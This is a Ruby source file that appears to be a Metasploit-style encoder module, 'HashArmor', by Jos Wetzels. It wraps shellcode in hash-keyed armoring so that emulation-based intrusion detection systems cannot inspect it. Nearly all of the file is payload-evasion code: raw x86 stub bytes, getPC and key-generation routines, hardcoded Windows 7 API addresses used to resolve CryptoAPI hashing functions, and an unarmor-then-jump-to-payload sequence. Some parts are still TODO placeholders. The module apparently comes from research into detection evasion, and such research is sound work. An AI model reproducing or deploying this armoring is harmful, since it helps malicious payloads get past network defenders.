# -*- coding: binary -*-

# =============================================================
# Hash-based Armoring class
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'ebnids/keygen'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # Anti-emulation armoring class using Hash-based armoring
  class HashArmor < AntiEmulArmor

    @@keyReg

    def initialize
      super(
        'Name'             => 'HARMOR',  
        'ID'               => 20,             
        'Description'      => 'Hash-based armoring',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 1,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # Overriden method to fill key registery
    # No returned code here because this is handled by getPCStub as key generation for CKPE has to precede getPC code
    #
    def fillKeyReg(keyReg, keyVal)
      @@keyReg = keyReg
      return ""
    end

    #
    # [*] Note:
    #
    def getPCStub(getPCDestReg)
      # TODO: some getPC code to be prepended to initally encoded payload
      return ""
    end

    # 
    #
    # [*] Note:
    #     - Can be improved by supporting multiple platforms
    #     - Can be improved by using actual 128-bit key instead of expanding 32-bit key to 128-bit
    #     - Can be improved by using full key in encoded GetPC stub as well
    #
    def encode(buf)
      badchars = @module_metadata['badchars']
      data = @module_metadata['datastore']
      key = data['CKPE_KEY'].hex

      # API addresses (win7 ultimate SP1 64-bit ENG)
      loadLibraryA = 0x7661499f
      getProcAddress = 0x76611222

      # Offsets
      functionArea = 0x79
      functionAreaPtr = 0x95
      sFunctions = 0x33
      armoredRuns = 0xA1

      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI] - Array[@@keyReg]
      gp_regs.shuffle

      reg1 = gp_regs[0]

      keyGenStub = Ebnids::KeyGen.keyGen(@@keyReg, data, badchars) + # generate CKPE key
                   Rex::Arch::X86.mov_reg(Rex::Arch::X86::EAX, @@keyReg) + # initialize all registers to appropriate parts (for now, expand 32-bit to 128-bit)
                   Rex::Arch::X86.mov_reg(Rex::Arch::X86::ECX, @@keyReg) + 
                   Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDX, @@keyReg) + 
                   Rex::Arch::X86.mov_reg(Rex::Arch::X86::EBX, @@keyReg) + 
                   "\xC3" # RET

      stub = Rex::Arch::X86.jmp_short(keyGenStub.bytesize) +
                  keyGenStub +
                  # startGetPC:
                  Rex::Arch::X86.call(-(keyGenStub.bytesize + 5)) +
                  Ebnids::GetPCStub.encodedStackGetPC(reg1, badchars, key, @@keyReg) + # execute getPC code
                  Rex::Arch::X86.pop_dword(@@keyReg) + # first pop to compensate for pushing of getPC code by stub generated by encodedStackGetPC
                  Rex::Arch::X86.sub(-(0xF0 + keyGenStub.bytesize), reg1, badchars, false, true) + # jump to codeEntryPoint (NOTE: 0x103 is based on static size of un-armoring stub
                  Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(reg1))

      # TODO: convert to Rex statements

      # unArmorRun
      stub = stub + "\x51\x89\xE8\x2D\x73\xFF\xFF\xFF\x31\xDB\x50\x53\x53\xBB\x05\x81\x01\x01\x81\xF3\x01\x01\x01\x01\x53\x89\xE8\x2D\x77\xFF\xFF\xFF\xFF\x30\x89\xE8\x2D\x7F\xFF\xFF\xFF\xFF\x10\x89\xE8\x83\xE8\x00\x31\xDB\x53\x6A\x12\x50\x89\xE8\x2D\x73\xFF\xFF\xFF\xFF\x30\x89\xE8\x2D\x7B\xFF\xFF\xFF\xFF\x10\x89\xE8\x2D\x6F\xFF\xFF\xFF\x31\xDB\x83\xEB\xEC\x89\x18\x89\xEB\x83\xEB\xEE\x53\x31\xC9\x51\x50\x53\x6A\x02\x89\xE8\x2D\x73\xFF\xFF\xFF\xFF\x30\x89\xE8\x83\xE8\x83\xFF\x10\x5B\x59\x01\xCB\x31\xC0\x66\x8B\x03\x89\xEB\x81\xEB\x63\xFF\xFF\xFF\x53\x8B\x1B\x66\x89\x03\x5B\x83\x03\x02\xC3"

      # unArmorSequence
      stub = stub + "\x89\xEB\x81\xEB\x63\xFF\xFF\xFF\x89\x03\x89\xEB\x81\xEB\x67\xFF\xFF\xFF\x89\x03\x89\xE8\x2D\x77\xFF\xFF\xFF\xBB\x01\x01\x01\xF1\x81\xF3\x01\x01\x01\x01\x53\x6A\x01\x31\xDB\x53\x53\x50\x89\xE8\x83\xE8\x87\xFF\x10\x89\xE8\x2D\x67\xFF\xFF\xFF\x8B\x30\x83\x3E\xFF\x74\x17\x50\x66\xAD\x66\x89\x45\x10\xAC\x31\xC9\x88\xC1\x46\x58\x89\x30\xE8\x19\xFF\xFF\xFF\xEB\xDB\xC3"

      # insertTerminatingNull
      insertNull = Rex::Arch::X86.set(Rex::Arch::X86::ECX, -1, badchars) +
                  Rex::Arch::X86.mov_byte(Rex::Arch::X86::EAX, 0xFF) +
                  "\xFC" + # CLD
                  "\xF2\xAE" + # REPNE SCASB
                  "\x4F" + # dec EDI
                  "\x30\xC0" + # xor AL, AL
                  "\x88\x07" + # mov [edi], al
                  "\xC3" # RET

      # codeEntryPoint
      tmpStub = insertNull + Rex::Arch::X86.jmp_short(0x79) + # jmp short getDataArea
                # gotDataArea
                Rex::Arch::X86.pop_dword(Rex::Arch::X86::EBP) +
                Rex::Arch::X86.mov_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EBP) +
                Rex::Arch::X86.sub(-(functionArea), Rex::Arch::X86::EAX, badchars, false, true) + # +functionArea
                Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) +

                "\x3E\x8F\x45" + (functionAreaPtr).chr + # pop dword [ebp + functionAreaPtr]
                "\x8D\x5D\x26" + # lea ebx, [ebp + sLibraries]
                Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDI, Rex::Arch::X86::EBX)

      tmpStub = tmpStub + Rex::Arch::X86.call(-(tmpStub.bytesize)) + # call insertTerminatingNull
             Rex::Arch::X86.push_reg(Rex::Arch::X86::EBX) + 
             Rex::Arch::X86.mov_dword(Rex::Arch::X86::EAX, loadLibraryA) +
             Rex::Arch::X86.call_reg(Rex::Arch::X86::EAX) + # call loadLibraryA("advapi32.dll")

             Rex::Arch::X86.mov_reg(Rex::Arch::X86::EBX, Rex::Arch::X86::EAX) + # ebx = advapi32.dll base
             "\x8D\x7D" + (sFunctions).chr # lea edi, [ebp + sFunctions]

      resolutionLoop = "\x80\x3F\xFF" + # cmp byte [edi], 0xFF
                       Rex::Arch::X86.je(0x2B) + # je done_resolving

                       Rex::Arch::X86.push_reg(Rex::Arch::X86::EDI)

      resolutionLoop = resolutionLoop + Rex::Arch::X86.call(-(resolutionLoop.bytesize + tmpStub.bytesize)) + # call insertTerminatingNull
                       Rex::Arch::X86.pop_dword(Rex::Arch::X86::EDI) +

                       Rex::Arch::X86.push_reg(Rex::Arch::X86::EDI) +
                       Rex::Arch::X86.push_reg(Rex::Arch::X86::EBX) +
                       Rex::Arch::X86.mov_dword(Rex::Arch::X86::EAX, getProcAddress) + 
                       Rex::Arch::X86.call_reg(Rex::Arch::X86::EAX) + # call GetProcAddress(advapi32, functionName)

                       Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDX, Rex::Arch::X86::EBP) +
                       Rex::Arch::X86.sub(-(functionAreaPtr), Rex::Arch::X86::EDX, badchars, false, true) + # +functionAreaPtr
                       Rex::Arch::X86.push_reg(Rex::Arch::X86::EDX) +

                       "\x8B\x12" + # mov edx, [edx]
                       "\x89\x02" + # mov [edx], eax

                       Rex::Arch::X86.pop_dword(Rex::Arch::X86::EDX) +
                       "\x83\x02\x04" + # add dword [edx], 4

                       Rex::Arch::X86.set(Rex::Arch::X86::ECX, -1, badchars) +
                       Rex::Arch::X86.set(Rex::Arch::X86::EAX, 0, badchars) +
                       "\xFC" + # CLD
                       "\xF2\xAE" + # REPNE SCASB

      resolutionLoop = resolutionLoop + Rex::Arch::X86.jmp_short(-(resolutionLoop.bytesize)) # jmp short resolutionLoop
      # done_resolving

      tmpStub = tmpStub + resolutionLoop +
             Rex::Arch::X86.call(-(stub.bytesize + tmpStub.bytesize + resolutionLoop.bytesize - 2)) + # call initKey

             # store_key:

             Rex::Arch::X86.mov_reg(Rex::Arch::X86::EDI, Rex::Arch::X86::EBP) + 
             "\x89\x07" + # mov [edi], eax
             "\x89\x4F\x04" + # mov [edi + 4], ecx
             "\x89\x57\x08" + # mov [edi + 8], edx
             "\x89\x5F\x0C" + # mov [edi + 12], ebx

             # unarmor_payload:

             Rex::Arch::X86.mov_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EBP) + 
             Rex::Arch::X86.sub(-(armoredRuns), Rex::Arch::X86::EDX, badchars, false, true) + # +functionAreaPtr
             Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX) +

             Rex::Arch::X86.call(-0xDF) + # call unArmorSequence

             # exec_payload:

             Rex::Arch::X86.pop_dword(Rex::Arch::X86::EAX) +
             Rex::Arch::X86.jmp_reg(Rex::Arch::X86.reg_name32(Rex::Arch::X86::EAX))

      # getDataArea
      stub = stub + tmpStub + 
             Rex::Arch::X86.call(-(tmpStub.bytesize - insertNull.bytesize + 3)) # call gotDataArea

      # DATA area
      keySegment = "\x91" * 16
      saltSegment = "\x93\x93"
      hashSpace = "\x92" * 20
      variableSpace = "\x93" * (4 * 6)
      # TODO: armor data
      armorSpace = "\x6F\x00\x0B\x0D\x6F\x00\x0B\x0D\x6F\x00\x0B\x0D\x19\x00\x09\x0A\xFF\xFF\xFF\xFF"

      dataArea = keySegment + saltSegment + hashSpace +
      "\x61\x64\x76\x61\x70\x69\x33\x32\x2E\x64\x6C\x6C\xFF\x43\x72\x79\x70\x74\x41\x63\x71\x75\x69\x72\x65\x43\x6F\x6E\x74\x65\x78\x74\x41\xFF\x43\x72\x79\x70\x74\x47\x65\x74\x48\x61\x73\x68\x50\x61\x72\x61\x6D\xFF\x43\x72\x79\x70\x74\x43\x72\x65\x61\x74\x65\x48\x61\x73\x68\xFF\x43\x72\x79\x70\x74\x48\x61\x73\x68\x44\x61\x74\x61\xFF\xFF" +
      variableSpace + armorSpace

      return stub + dataArea
    end

  end

end
